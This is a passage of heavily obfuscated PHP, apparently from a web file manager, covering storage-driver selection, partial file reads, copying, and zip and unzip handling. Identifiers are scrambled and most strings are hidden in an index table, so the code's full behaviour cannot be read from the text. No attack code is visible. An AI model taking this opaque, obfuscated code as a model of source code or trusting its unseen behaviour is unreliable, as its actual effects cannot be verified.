$ÅÀèƒ¾’[$±Ü˜õŒò]; break; } else { if ($áıÖ÷—ò > $ÅÀèƒ¾’[$±Ü˜õŒò - 1] && $áıÖ÷—ò <= $ÅÀèƒ¾’[$±Ü˜õŒò]) { $áıÖ÷—ò = $ÅÀèƒ¾’[$±Ü˜õŒò]; break; } else { if ($±Ü˜õŒò == count($ÅÀèƒ¾’) - 1 && $áıÖ÷—ò > $ÅÀèƒ¾’[$±Ü˜õŒò]) { $áıÖ÷—ò = $ÅÀèƒ¾’[$±Ü˜õŒò]; break; } } } } $Ìï¨éÚ´ = self::driverMake($êñ¶£úÄ); if ($Ìï¨éÚ´->isFileOutServer()) { return $Ìï¨éÚ´->fileOutImageServer($êñ¶£úÄ, $áıÖ÷—ò); } return $Ìï¨éÚ´->fileOutImage($êñ¶£úÄ, $áıÖ÷—ò); } private static function driverIsSame($…ÄÏ“Ô”, $ıŠİ«±¼) { $Ä”Æíò· =& $_SERVER[ìïæ“œî]; $ úˆ«÷ı = $…ÄÏ“Ô”->getType(); $™‘“˜ªÀ = $ıŠİ«±¼->getType(); if ($ úˆ«÷ı != $™‘“˜ªÀ) { return !1; } if ($ úˆ«÷ı == $Ä”Æíò·[806]) { return !0; } if ($ úˆ«÷ı == $Ä”Æíò·[109]) { return !0; } if ($…ÄÏ“Ô”->pathDriver == $ıŠİ«±¼->pathDriver) { return !0; } return !1; } public static function copyUpdate($¯¦¸šæ§, $şàØƒ‹è) { $‹¼£ğ®º =& $_SERVER[ìïæ“œî]; if (!IO::exist($¯¦¸šæ§)) { return !1; } if (!IO::exist($şàØƒ‹è)) { IO::mkdir($şàØƒ‹è); } $ÔßÇ°ÂÂ = array_to_keyvalue(self::listAllSimple($¯¦¸šæ§), $‹¼£ğ®º[87]); $ç»Òûñ‚ = array_to_keyvalue(self::listAllSimple($şàØƒ‹è), $‹¼£ğ®º[87]); $ÂÇ‚Æì· = array(); $«®«  = array(); foreach ($ÔßÇ°ÂÂ as $„¸¹¶‘ñ => $ºÔû²†) { if (isset($ç»Òûñ‚[$„¸¹¶‘ñ])) { if ($ºÔû²†[$‹¼£ğ®º[78]] == 1) { continue; } if ($ç»Òûñ‚[$„¸¹¶‘ñ][$‹¼£ğ®º[79]] == $ºÔû²†[$‹¼£ğ®º[79]]) { continue; } } if ($ºÔû²†[$‹¼£ğ®º[78]] == 1) { $«®« [] = $şàØƒ‹è . $‹¼£ğ®º[8] . trim($„¸¹¶‘ñ, $‹¼£ğ®º[8]); continue; } $†ÜñˆÛş = strstr(trim($„¸¹¶‘ñ, $‹¼£ğ®º[8]), $‹¼£ğ®º[8]) ? get_path_father($„¸¹¶‘ñ) : $‹¼£ğ®º[12]; $ÂÇ‚Æì·[] = array($‹¼£ğ®º[1218] => $ºÔû²†[$‹¼£ğ®º[89]], $‹¼£ğ®º[1219] => rtrim($şàØƒ‹è, $‹¼£ğ®º[8]) . $‹¼£ğ®º[8] . $†ÜñˆÛş, $‹¼£ğ®º[1220] => $ºÔû²†); } $ÁÙ½˜Ìã = array($‹¼£ğ®º[230] => $ÂÇ‚Æì·, $‹¼£ğ®º[78] => $«®« ); Hook::trigger($‹¼£ğ®º[1221], $¯¦¸šæ§, $şàØƒ‹è, $ÁÙ½˜Ìã); foreach ($«®«  as $ºÔû²†) { IO::mkdir($ºÔû²†); } foreach ($ÂÇ‚Æì· as $ºÔû²†) { IO::copy($ºÔû²†[$‹¼£ğ®º[1218]], $ºÔû²†[$‹¼£ğ®º[1219]], REPEAT_REPLACE); } } public static function fileSubstr($ë‘éµÌ², $û‰ÏÂ‚¢, $Üœ°œ—İ = false) { $Û‚‰²°ù =& $_SERVER[ìïæ“œî]; $³×è¿Óî = self::driverMake($ë‘éµÌ²); $çÀö…’€ = $³×è¿Óî->size($ë‘éµÌ²); $›¯á½ß« = $û‰ÏÂ‚¢; $İİ¶´êÖ = $Üœ°œ—İ; if ($û‰ÏÂ‚¢ < 0) { $û‰ÏÂ‚¢ = $çÀö…’€ + $û‰ÏÂ‚¢; } if ($Üœ°œ—İ === !1) { $Üœ°œ—İ = $çÀö…’€ - $û‰ÏÂ‚¢; } if ($û‰ÏÂ‚¢ + $Üœ°œ—İ > $çÀö…’€) { $Üœ°œ—İ = $çÀö…’€ - $û‰ÏÂ‚¢; } if (!$çÀö…’€ && $³×è¿Óî->getType() == $Û‚‰²°ù[109] && !$³×è¿Óî->exist($ë‘éµÌ²)) { $˜„Ç”ª£ = get_path_this($ë‘éµÌ²); $£Ö—ŠäÇ = parse_url_query($˜„Ç”ª£); if (is_array($£Ö—ŠäÇ) && isset($£Ö—ŠäÇ[$Û‚‰²°ù[32]])) { $˜„Ç”ª£ = urldecode($£Ö—ŠäÇ[$Û‚‰²°ù[32]]); } throw new Exception($Û‚‰²°ù[1222] . LNG($Û‚‰²°ù[1223]) . $Û‚‰²°ù[1021] . clear_html($˜„Ç”ª£) . $Û‚‰²°ù[12]); } if ($Üœ°œ—İ <= 0) { return $Û‚‰²°ù[12]; } if ($û‰ÏÂ‚¢ < 0 || $û‰ÏÂ‚¢ >= $çÀö…’€ || $Üœ°œ—İ > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\x65\x52\145\x61\144\40\145\162\162\157\162\41\x20\x73\164\141\x72\x74\75{$û‰ÏÂ‚¢}\x3b\x6c\x65\x6e\x67\164\150\x3d{$Üœ°œ—İ}\73\x20\163\x69\x7a\145\75{$çÀö…’€}\x3b"); } $Ø“ü¥¶ = $³×è¿Óî->fileSubstr($ë‘éµÌ², $û‰ÏÂ‚¢, $Üœ°œ—İ); if (!$Ø“ü¥¶ && $Üœ°œ—İ && isset($GLOBALS[$Û‚‰²°ù[1224]])) { throw new Exception($GLOBALS[$Û‚‰²°ù[1224]][$Û‚‰²°ù[1225]]); } return $Ø“ü¥¶; } private static function driverMake(&$ş¢õÇ“ş) { $á¨Œ»ì =& $_SERVER[ìïæ“œî]; $íóò®ß¨ = KodIO::parse($ş¢õÇ“ş); if (!self::$driverListSystem) { $ÃüÂüœ´ = Model($á¨Œ»ì[816])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ÃüÂüœ´, $á¨Œ»ì[475]); } if ($íóò®ß¨[$á¨Œ»ì[33]] == KodIO::KOD_IO && !self::$driverListSystem[$íóò®ß¨[$á¨Œ»ì[475]]]) { throw new Exception($á¨Œ»ì[1226]); return !1; } $ş¢õÇ“ş = $íóò®ß¨[$á¨Œ»ì[1227]]; $Œ°Œ½¥ı = self::driverGet($íóò®ß¨, $ş¢õÇ“ş); return $Œ°Œ½¥ı; } private static function driverGet($Î’·’, &$´Êè·×š) { $Ä²„ñŒ  =& $_SERVER[ìïæ“œî]; $‘–ƒâ”è = $Î’·’[$Ä²„ñŒ [1228]]; $÷Ó¦§×Ò = $Î’·’[$Ä²„ñŒ [475]]; switch ($Î’·’[$Ä²„ñŒ [33]]) { case KodIO::KOD_IO: $ºöÕú¡Ï = self::$driverListSystem[$÷Ó¦§×Ò]; break; case KodIO::KOD_SOURCE: $´Êè·×š = $÷Ó¦§×Ò . $´Êè·×š; $ºöÕú¡Ï = array($Ä²„ñŒ [1229] => $Ä²„ñŒ [1230], $Ä²„ñŒ [6] => $Î’·’); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $˜ü÷ÇÎÊ = $GLOBALS[$Ä²„ñŒ [1231]]; self::$driverListUser = array_to_keyvalue($˜ü÷ÇÎÊ, $Ä²„ñŒ [475]); } $ºöÕú¡Ï = self::$driverListUser[$÷Ó¦§×Ò]; break; case KodIO::KOD_SHARE_LINK: $ºöÕú¡Ï = array($Ä²„ñŒ [1229] => $Ä²„ñŒ [1232], $Ä²„ñŒ [6] => $Î’·’); $º³¦Œï¯ = Action($Ä²„ñŒ [1233])->sharePathInfo($Î’·’[$Ä²„ñŒ [87]]); $´Êè·×š = $º³¦Œï¯[$Ä²„ñŒ [193]]; if (!$º³¦Œï¯[$Ä²„ñŒ [193]]) { $Ê¥¨‡Áš = Model($Ä²„ñŒ [664])->getInfo($º³¦Œï¯[$Ä²„ñŒ [665]]); $´Êè·×š = KodIO::clear($Ê¥¨‡Áš[$Ä²„ñŒ [1234]] . $Î’·’[$Ä²„ñŒ [1227]]); $Î’·’[$Ä²„ñŒ [560]] = $Ê¥¨‡Áš; $Î’·’[$Ä²„ñŒ [1209]] = $´Êè·×š; $ºöÕú¡Ï = array($Ä²„ñŒ [1229] => $Ä²„ñŒ [1235], $Ä²„ñŒ [6] => $Î’·’); } break; case KodIO::KOD_SHARE_ITEM: $ºöÕú¡Ï = array($Ä²„ñŒ [1229] => $Ä²„ñŒ [1236], $Ä²„ñŒ [6] => $Î’·’); $Ê¥¨‡Áš = Model($Ä²„ñŒ [664])->getInfo($Î’·’[$Ä²„ñŒ [475]]); if ($Ê¥¨‡Áš[$Ä²„ñŒ [193]] == $Ä²„ñŒ [228]) { $´Êè·×š = KodIO::clear($Ê¥¨‡Áš[$Ä²„ñŒ [1234]] . $Î’·’[$Ä²„ñŒ [1227]]); $Î’·’[$Ä²„ñŒ [560]] = $Ê¥¨‡Áš; $Î’·’[$Ä²„ñŒ [1209]] = $´Êè·×š; $ºöÕú¡Ï = array($Ä²„ñŒ [1229] => $Ä²„ñŒ [1237], $Ä²„ñŒ [6] => $Î’·’); } else { if (!$´Êè·×š) { $´Êè·×š = $Ê¥¨‡Áš[$Ä²„ñŒ [193]]; } } break; default: $´Êè·×š = $Î’·’[$Ä²„ñŒ [87]]; $ºöÕú¡Ï = array($Ä²„ñŒ [1229] => $Ä²„ñŒ [1238]); break; } $ñ™ÉâÕµ = $Î’·’[$Ä²„ñŒ [87]]; if (!isset(self::$driverCache[$ñ™ÉâÕµ])) { $»ƒó¥¸ß = strtolower($ºöÕú¡Ï[$Ä²„ñŒ [98]]); $À½À¹¡Ä = $GLOBALS[$Ä²„ñŒ [6]][$Ä²„ñŒ [92]][$Ä²„ñŒ [874]]; $şËß‘š˜ = $Ä²„ñŒ [77] . (isset($À½À¹¡Ä[$»ƒó¥¸ß]) ? $À½À¹¡Ä[$»ƒó¥¸ß] : ucfirst($»ƒó¥¸ß)); if (!class_exists($şËß‘š˜)) { show_json("{$şËß‘š˜}\x20\x6e\157\x74\40\145\x78\x69\163\164\163\x21", !1); } $õ¢ØË‡ø = isset($ºöÕú¡Ï[$Ä²„ñŒ [6]]) ? $ºöÕú¡Ï[$Ä²„ñŒ [6]] : !1; self::$driverCache[$ñ™ÉâÕµ] = new $şËß‘š˜($õ¢ØË‡ø); } $Œ¼ÆË¼ = self::$driverCache[$ñ™ÉâÕµ]; $Œ¼ÆË¼->pathDriver = $‘–ƒâ”è; $Œ¼ÆË¼->pathBase = $Ä²„ñŒ [12]; if (isset($ºöÕú¡Ï[$Ä²„ñŒ [6]][$Ä²„ñŒ [1239]])) { $Œ¼ÆË¼->pathBase = rtrim($ºöÕú¡Ï[$Ä²„ñŒ [6]][$Ä²„ñŒ [1239]], $Ä²„ñŒ [8]) . $Ä²„ñŒ [8]; $´Êè·×š = $Œ¼ÆË¼->pathBase . ltrim($´Êè·×š, $Ä²„ñŒ [8]); } $´Êè·×š = $Œ¼ÆË¼->getPath($´Êè·×š); if (isset($Î’·’[$Ä²„ñŒ [1209]])) { $´Êè·×š = $Î’·’[$Ä²„ñŒ [1209]]; } $Œ¼ÆË¼->path = $´Êè·×š; return $Œ¼ÆË¼; } public static function errorTips($Ş¯ªÜğ = false) { $ù¨…ÜìÔ =& $_SERVER[ìïæ“œî]; static $°›•ùî = array(); $Öâ­­ùÂ = 1000; if ($Ş¯ªÜğ === -1) { return $°›•ùî ? $°›•ùî[count($°›•ùî) - 1] : $ù¨…ÜìÔ[12]; } if ($Ş¯ªÜğ === !1) { return implode($ù¨…ÜìÔ[262], $°›•ùî); } if (count($°›•ùî) >= $Öâ­­ùÂ) { $°›•ùî = array_slice($°›•ùî, $Öâ­­ùÂ * 0.5, $Öâ­­ùÂ); } $°›•ùî[] = $Ş¯ªÜğ; write_log($ù¨…ÜìÔ[176] . ACTION . $ù¨…ÜìÔ[1240] . $Ş¯ªÜğ, $ù¨…ÜìÔ[1241]); } public static function getLastError($ô·ˆ†° = '') { $—°ß‘Î = self::errorTips(-1); return $—°ß‘Î ? $—°ß‘Î : $ô·ˆ†°; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Ò›Æ­ç„; if ($Ò›Æ­ç„) { return $Ò›Æ­ç„; } $ÆêÒ€Í… = IO::init($_SERVER[ìïæ“œî][8]); return $ÆêÒ€Í…; } private static function iconvSystem($¬À”¼ã¢) { return self::local()->iconvSystem($¬À”¼ã¢); } private static function iconvApp($Ê‚º©ÈŠ) { return self::local()->iconvApp($Ê‚º©ÈŠ); } public static function zipFolder($·†ö¾Ûƒ, $Äç­œ†Ö = "\x7a\x69\x70", $”‚Ÿò¹ = '', $®ˆ•¦ºÌ = REPEAT_RENAME) { $©Áãí”Ñ =& $_SERVER[ìïæ“œî]; $îÛ²Õå® = IO::listPath($·†ö¾Ûƒ); if (!$îÛ²Õå®) { return !1; } $îÛ²Õå® = array_merge($îÛ²Õå®[$©Áãí”Ñ[85]], $îÛ²Õå®[$©Áãí”Ñ[86]]); return self::zip($îÛ²Õå®, $Äç­œ†Ö, $”‚Ÿò¹, $®ˆ•¦ºÌ); } public static function zip($úşà‘Ï, $´–ë¼ˆÅ = "\x7a\151\x70", $ê¦İ­™ = '', $Ÿ…Ôü—ô = REPEAT_RENAME) { $Ö£Ú¡•µ =& $_SERVER[ìïæ“œî]; if (is_string($úşà‘Ï) && $úşà‘Ï) { $úşà‘Ï = array(array($Ö£Ú¡•µ[87] => $úşà‘Ï)); } $¶„Úæ¤ = self::init($úşà‘Ï[0][$Ö£Ú¡•µ[87]]); $Ò”ÑšÕ§ = self::info($úşà‘Ï[0][$Ö£Ú¡•µ[87]]); $À¤§‘âÊ = $Ö£Ú¡•µ[12]; $Ú¹ìúã« = $Ö£Ú¡•µ[12]; $ûşƒ›ğ¹ = $Ö£Ú¡•µ[12]; if ($ê¦İ­™ && substr($ê¦İ­™, -1, 1) != $Ö£Ú¡•µ[8]) { $Ú¹ìúã« = get_path_father($ê¦İ­™); $ûşƒ›ğ¹ = get_path_this($ê¦İ­™); } else { $Ú¹ìúã« = self::pathFather($Ò”ÑšÕ§[$Ö£Ú¡•µ[87]]); $ûşƒ›ğ¹ = $Ò”ÑšÕ§[$Ö£Ú¡•µ[32]] . $Ö£Ú¡•µ[10] . $´–ë¼ˆÅ; if (count($úşà‘Ï) > 1) { $·Œ—¢Öä = IO::info($Ú¹ìúã«); $ûşƒ›ğ¹ = $·Œ—¢Öä[$Ö£Ú¡•µ[32]] . $Ö£Ú¡•µ[10] . $´–ë¼ˆÅ; } if ($ê¦İ­™) { $Ú¹ìúã« = $ê¦İ­™; } } if ($¶„Úæ¤->getType() == $Ö£Ú¡•µ[109]) { $åÃúÃïĞ = self::init($Ú¹ìúã«); $ßìÂµûğ = $åÃúÃïĞ->getType() == $Ö£Ú¡•µ[109] ? $Ú¹ìúã« : get_path_father($¶„Úæ¤->path); $ßìÂµûğ = rtrim($ßìÂµûğ, $Ö£Ú¡•µ[8]) . $Ö£Ú¡•µ[8]; mk_dir($ßìÂµûğ); } else { $À¤§‘âÊ = TEMP_FILES . $Ö£Ú¡•µ[1242] . time() . rand_string(8) . $Ö£Ú¡•µ[8]; mk_dir($À¤§‘âÊ); file_put_contents($À¤§‘âÊ . $Ö£Ú¡•µ[1243], $Ö£Ú¡•µ[12]); $ßìÂµûğ = $À¤§‘âÊ; } $¶ø«ºúŠ = IO::info($ßìÂµûğ); if (!$¶ø«ºúŠ || !$¶ø«ºúŠ[$Ö£Ú¡•µ[233]]) { show_json(LNG($Ö£Ú¡•µ[1244]), !1); } $´ùƒÖš‚ = self::zipFileList($úşà‘Ï, $À¤§‘âÊ); foreach ($´ùƒÖš‚ as $©åÃî†Š => $şœÀ£Œ) { $´ùƒÖš‚[$©åÃî†Š] = self::iconvSystem($şœÀ£Œ); } $ÜàÆÊô = get_filename_auto($ßìÂµûğ . $ûşƒ›ğ¹, $Ö£Ú¡•µ[12], $Ÿ…Ôü—ô); KodArchive::create(self::iconvSystem($ÜàÆÊô), $´ùƒÖš‚); if (!IO::exist($ÜàÆÊô)) { if ($À¤§‘âÊ) { del_dir($À¤§‘âÊ); } write_log($Ö£Ú¡•µ[1245] . $ÜàÆÊô, $Ö£Ú¡•µ[389]); show_json(LNG($Ö£Ú¡•µ[1246]), !1); } if (!$À¤§‘âÊ) { return $ÜàÆÊô; } $ìÙÀ£÷Â = self::move($ÜàÆÊô, $Ú¹ìúã«, $Ÿ…Ôü—ô); if ($À¤§‘âÊ) { del_dir($À¤§‘âÊ); } if (!$ÜàÆÊô) { write_log($Ö£Ú¡•µ[1247] . $ÜàÆÊô . $Ö£Ú¡•µ[1248] . $Ú¹ìúã«, $Ö£Ú¡•µ[389]); show_json(LNG($Ö£Ú¡•µ[1246]), !1); } return $ìÙÀ£÷Â; } public static function unzip($¦¿¯¹Ğ, $ÀÉõ¤ ³, $»Éæ‹Ö¢ = "\55\x31", $Èû¥Õãª = "\162\145\x70\154\x61\x63\x65") { $ô‰·Ú± =& $_SERVER[ìïæ“œî]; $—òŠÜ¬ = parent::info($¦¿¯¹Ğ); if (!$—òŠÜ¬) { show_json(LNG($ô‰·Ú±[1249]), !1); } $Î·éÎÛ€ = IO::infoFullSimple($ÀÉõ¤ ³); if (!$Î·éÎÛ€) { $ÀÉõ¤ ³ = IO::mkdir($ÀÉõ¤ ³); } if (isset($Î·éÎÛ€[$ô‰·Ú±[193]]) && trim($Î·éÎÛ€[$ô‰·Ú±[87]], $ô‰·Ú±[8]) != trim($ÀÉõ¤ ³, $ô‰·Ú±[8])) { $Ö†™È = KodIO::make($Î·éÎÛ€[$ô‰·Ú±[192]]); $¶ì›ªˆ = IO::fileNameAuto($Ö†™È, $Î·éÎÛ€[$ô‰·Ú±[32]], REPEAT_RENAME_FOLDER, !0); $ÀÉõ¤ ³ = IO::mkdir($Ö†™È . $¶ì›ªˆ); } $»Éæ‹Ö¢ = $»Éæ‹Ö¢ && $»Éæ‹Ö¢ != $ô‰·Ú±[1250] ? @json_decode($»Éæ‹Ö¢, !0) : -1; $ÉãÎ”Ç = self::unzipPart($¦¿¯¹Ğ, $»Éæ‹Ö¢); if (!$ÉãÎ”Ç || !IO::exist($ÉãÎ”Ç[$ô‰·Ú±[230]])) { show_json(LNG($ô‰·Ú±[108]), !1); } $úÉ÷™• = $ÉãÎ”Ç[$ô‰·Ú±[1251]][count($ÉãÎ”Ç[$ô‰·Ú±[1251]]) - 1]; if ($úÉ÷™•[$ô‰·Ú±[1252]] == -1 || substr($úÉ÷™•[$ô‰·Ú±[32]], -1, 1) == $ô‰·Ú±[8]) { $¥Îä‹şß = $ÉãÎ”Ç[$ô‰·Ú±[1253]] . rand_string(10) . $ô‰·Ú±[8]; mk_dir($¥Îä‹şß); $½”¢ş›û = count($ÉãÎ”Ç[$ô‰·Ú±[1251]]) == 1 ? IO::ext($¦¿¯¹Ğ) : get_path_ext($ÉãÎ”Ç[$ô‰·Ú±[230]]); $ÙÜ”¹Ô = KodArchive::extract(self::iconvSystem($ÉãÎ”Ç[$ô‰·Ú±[230]]), $¥Îä‹şß, $úÉ÷™•[$ô‰·Ú±[1252]], $¶ì›ªˆ, $½”¢ş›û); self::unzipErrorCheck($ÙÜ”¹Ô, array($ô‰·Ú±[1254], $¦¿¯¹Ğ, $½”¢ş›û, $ÀÉõ¤ ³, $ÉãÎ”Ç)); Hook::trigger($ô‰·Ú±[1255], $¥Îä‹şß); recursion_dir($¥Îä‹şß, $ˆÃ“â´û, $‘ËÂ¸³˜, 0); $ÖÃ°ÅüÍ = array_merge($ˆÃ“â´û, $‘ËÂ¸³˜); $Ìà¼‡¿¢ = array(); foreach ($ÖÃ°ÅüÍ as $¶Ü¸˜Ö‰) { $º€’Äå = IO::move(self::iconvApp($¶Ü¸˜Ö‰), $ÀÉõ¤ ³, $Èû¥Õãª); if ($º€’Äå) { $Ìà¼‡¿¢[] = $º€’Äå; } } del_dir($¥Îä‹şß); } else { $º€’Äå = IO::move($ÉãÎ”Ç[$ô‰·Ú±[230]], $ÀÉõ¤ ³, $Èû¥Õãª, get_path_this($úÉ÷™•[$ô‰·Ú±[32]])); if ($º€’Äå) { $Ìà¼‡¿¢[] = $º€’Äå; } } return $Ìà¼‡¿¢ ? $Ìà¼‡¿¢ : !1; } public static function unzipList($çŸ”ÒÊÊ) { $ã¿·µ€¿ =& $_SERVER[ìïæ“œî]; $ı˜ÆÃ–’ = isset($çŸ”ÒÊÊ[$ã¿·µ€¿[1256]]) ? $çŸ”ÒÊÊ[$ã¿·µ€¿[1256]] : !1; $Şˆ”øÄª = isset($çŸ”ÒÊÊ[$ã¿·µ€¿[1252]]) ? @json_decode($çŸ”ÒÊÊ[$ã¿·µ€¿[1252]], !0) : -1; $µÆĞ«“ = self::unzipPart($çŸ”ÒÊÊ[$ã¿·µ€¿[87]], $Şˆ”øÄª); if (!$µÆĞ«“ || !IO::exist($µÆĞ«“[$ã¿·µ€¿[230]])) { show_json(LNG($ã¿·µ€¿[108]), !1); } $¨øúŠ¦á = $µÆĞ«“[$ã¿·µ€¿[1251]][count($µÆĞ«“[$ã¿·µ€¿[1251]]) - 1]; $À·Šù¬ú = in_array(IO::ext($µÆĞ«“[$ã¿·µ€¿[230]]), array($ã¿·µ€¿[389], $ã¿·µ€¿[1257], $ã¿·µ€¿[1258], $ã¿·µ€¿[1259], $ã¿·µ€¿[1260], $ã¿·µ€¿[1261])); if (!$ı˜ÆÃ–’ && ($¨øúŠ¦á[$ã¿·µ€¿[1252]] == -1 || $À·Šù¬ú)) { $ÏÛ¤…€ = $µÆĞ«“[$ã¿·µ€¿[1253]] . get_path_this($µÆĞ«“[$ã¿·µ€¿[230]]) . $ã¿·µ€¿[1262]; if (!IO::exist($ÏÛ¤…€)) { $É‹­Íë = $¨øúŠ¦á[$ã¿·µ€¿[1252]] == -1 ? get_path_ext(IO::pathThis($çŸ”ÒÊÊ[$ã¿·µ€¿[87]])) : get_path_ext($µÆĞ«“[$ã¿·µ€¿[230]]); $£¾åºÖ‰ = KodArchive::listContent(self::iconvSystem($µÆĞ«“[$ã¿·µ€¿[230]]), !0, $É‹­Íë); self::unzipErrorCheck($£¾åºÖ‰, array($ã¿·µ€¿[1263], $çŸ”ÒÊÊ, $µÆĞ«“)); @file_put_contents($ÏÛ¤…€, json_encode($£¾åºÖ‰[$ã¿·µ€¿[1264]])); } return @json_decode(IO::getContent($ÏÛ¤…€), !0); } IO::fileOut($µÆĞ«“[$ã¿·µ€¿[230]], $ı˜ÆÃ–’, get_path_this($¨øúŠ¦á[$ã¿·µ€¿[32]])); die; } private static function zipFileList($¢Ø‹§¢§, $½Ö‘üÕò = false) { $…‘„Ó Í =& $_SERVER[ìïæ“œî]; $à©³Ş²ã = array(); foreach ($¢Ø‹§¢§ as $ù—ã¢¿¾) { $¹ˆşØ¯ç = $ù—ã¢¿¾[$…‘„Ó Í[87]]; if ($½Ö‘üÕò) { $¹ˆşØ¯ç = self::copy($ù—ã¢¿¾[$…‘„Ó Í[87]], $½Ö‘üÕò, $…‘„Ó Í[867]); } else { $ÓÎİ¦ = self::init($ù—ã¢¿¾[$…‘„Ó Í[87]]); if ($ÓÎİ¦->getType() == $…‘„Ó Í[109]) { $¹ˆşØ¯ç = $ÓÎİ¦->path; } } if ($¹ˆşØ¯ç && self::local()->exist($¹ˆşØ¯ç)) { $à©³Ş²ã[$ù—ã¢¿¾[$…‘„Ó Í[87]]] = $¹ˆşØ¯ç; } } if (!empty($à©³Ş²ã)) { return array_values($à©³Ş²ã); } show_json(LNG($…‘„Ó Í[1223]), !1); } private static function localFilePath($¶ğœ’‘) { $İï¾—¹ğ =& $_SERVER[ìïæ“œî]; $ĞËÊ®ÂÓ = KodIO::parse($¶ğœ’‘); if ($ĞËÊ®ÂÓ[$İï¾—¹ğ[33]] == KodIO::KOD_SOURCE) { $Š¼õ—ÜÛ = Model($İï¾—¹ğ[873])->fileInfoGet(KodIO::sourceID($¶ğœ’‘)); if (!$Š¼õ—ÜÛ[$İï¾—¹ğ[87]]) { show_json($İï¾—¹ğ[1265], !1); } $¶ğœ’‘ = $Š¼õ—ÜÛ[$İï¾—¹ğ[87]]; } $‹öƒÁé = self::init($¶ğœ’‘); if ($‹öƒÁé->pathParse[$İï¾—¹ğ[1209]]) { $¶ğœ’‘ = $‹öƒÁé->pathParse[$İï¾—¹ğ[1209]]; $‹öƒÁé = self::init($¶ğœ’‘); } $Ü‹áú’ = $‹öƒÁé->getType(); if ($Ü‹áú’ == $İï¾—¹ğ[109] || $Ü‹áú’ == $İï¾—¹ğ[1266]) { if (!$‹öƒÁé->exist($‹öƒÁé->path)) { show_json(LNG($İï¾—¹ğ[108]), !1); } return $‹öƒÁé->path; } return !1; } public static function unzipPart($ÖÎµŸÆ•, $ÇÎ§ô–Ÿ = -1) { $ƒ½Ó¢“Ñ =& $_SERVER[ìïæ“œî]; $Ïõ™Ÿ = IO::pathThis($ÖÎµŸÆ•); if (!$ÇÎ§ô–Ÿ || $ÇÎ§ô–Ÿ == -1) { $‡’×Û® = array(array($ƒ½Ó¢“Ñ[32] => $Ïõ™Ÿ, $ƒ½Ó¢“Ñ[1252] => -1)); $‡’×Û®[0][$ƒ½Ó¢“Ñ[1267]] = $‡’×Û®[0][$ƒ½Ó¢“Ñ[32]]; } else { if (is_array($ÇÎ§ô–Ÿ)) { $‡’×Û® = $ÇÎ§ô–Ÿ; $÷µÖÛ‡’ = count($‡’×Û®) - 1; for ($íø…Ò«ë = 0; $íø…Ò«ë <= $÷µÖÛ‡’; $íø…Ò«ë++) { $Öä¥¾³© = $‡’×Û®[$íø…Ò«ë]; $·Àü”óÚ = get_path_this($Öä¥¾³©[$ƒ½Ó¢“Ñ[32]]) . (checkExtSafe($Öä¥¾³©[$ƒ½Ó¢“Ñ[32]]) ? $ƒ½Ó¢“Ñ[12] : $ƒ½Ó¢“Ñ[1268]); $‡’×Û®[$íø…Ò«ë][$ƒ½Ó¢“Ñ[1267]] = $ƒ½Ó¢“Ñ[1269] . intval($Öä¥¾³©[$ƒ½Ó¢“Ñ[1252]]) . $ƒ½Ó¢“Ñ[462] . $·Àü”óÚ; if ($íø…Ò«ë == 0) { continue; } $‡’×Û®[$íø…Ò«ë][$ƒ½Ó¢“Ñ[1267]] = $‡’×Û®[$íø…Ò«ë - 1][$ƒ½Ó¢“Ñ[1267]] . $ƒ½Ó¢“Ñ[1270] . $‡’×Û®[$íø…Ò«ë][$ƒ½Ó¢“Ñ[1267]]; } } } if (!is_array($‡’×Û®) || count($‡’×Û®) == 0) { return !1; } $ËñÆ¿šÛ = $‡’×Û®[count($‡’×Û®) - 1]; if (!IO::exist($ÖÎµŸÆ•)) { return !1; } $¶ğÜ‰Öü = TEMP_FILES . $ƒ½Ó¢“Ñ[1271] . kodIO::hashPathSafe($ÖÎµŸÆ•) . $ƒ½Ó¢“Ñ[8]; $¡„Óèö = $¶ğÜ‰Öü . $ËñÆ¿šÛ[$ƒ½Ó¢“Ñ[1267]]; mk_dir($¶ğÜ‰Öü); file_put_contents(TEMP_FILES . $ƒ½Ó¢“Ñ[1243], $ƒ½Ó¢“Ñ[12]); if (IO::exist($¡„Óèö)) { return array($ƒ½Ó¢“Ñ[230] => $¡„Óèö, $ƒ½Ó¢“Ñ[1251] => $‡’×Û®, $ƒ½Ó¢“Ñ[1253] => $¶ğÜ‰Öü); } $Ç­“˜Üè = self::localFilePath($ÖÎµŸÆ•); if (!$Ç­“˜Üè) { $Ç­“˜Üè = $¶ğÜ‰Öü . $ƒ½Ó¢“Ñ[1272]; if (!IO::exist($Ç­“˜Üè)) { self::copy($ÖÎµŸÆ•, $¶ğÜ‰Öü, !1, get_path_this($Ç­“˜Üè)); } } if (!$Ç­“˜Üè || !IO::exist($Ç­“˜Üè)) { return !1; } if ($ËñÆ¿šÛ[$ƒ½Ó¢“Ñ[1252]] == -1) { return array($ƒ½Ó¢“Ñ[230] => $Ç­“˜Üè, $ƒ½Ó¢“Ñ[1251] => $‡’×Û®, $ƒ½Ó¢“Ñ[1253] => $¶ğÜ‰Öü); } $±ÔåõŸ = $Ç­“˜Üè; foreach ($‡’×Û® as $íø…Ò«ë => $Öä¥¾³©) { if (!$Öä¥¾³© || $Öä¥¾³©[$ƒ½Ó¢“Ñ[1252]] == $ƒ½Ó¢“Ñ[1250]) { break; } if (substr($Öä¥¾³©[$ƒ½Ó¢“Ñ[32]], -1, 1) == $ƒ½Ó¢“Ñ[8]) { break; } $Ê¾öãà = in_array(get_path_ext($Öä¥¾³©[$ƒ½Ó¢“Ñ[1267]]), array($ƒ½Ó¢“Ñ[389], $ƒ½Ó¢“Ñ[1257], $ƒ½Ó¢“Ñ[1258], $ƒ½Ó¢“Ñ[1259], $ƒ½Ó¢“Ñ[1260], $ƒ½Ó¢“Ñ[1261])); $¤Ò‰‹‚± = $íø…Ò«ë == count($‡’×Û®) - 1 && $Ê¾öãà; $ßéŞ‚îÑ = $¶ğÜ‰Öü . $Öä¥¾³©[$ƒ½Ó¢“Ñ[1267]]; $¡èÆáÇí = $¶ğÜ‰Öü . get_path_this($Öä¥¾³©[$ƒ½Ó¢“Ñ[32]]); if (IO::exist($ßéŞ‚îÑ)) { $±ÔåõŸ = $ßéŞ‚îÑ; continue; } $é¢ÒÆ®È = $íø…Ò«ë == 0 ? get_path_ext($Ïõ™Ÿ) : get_path_ext($±ÔåõŸ); $ƒ¥Óú€÷ = KodArchive::extract(self::iconvSystem($±ÔåõŸ), 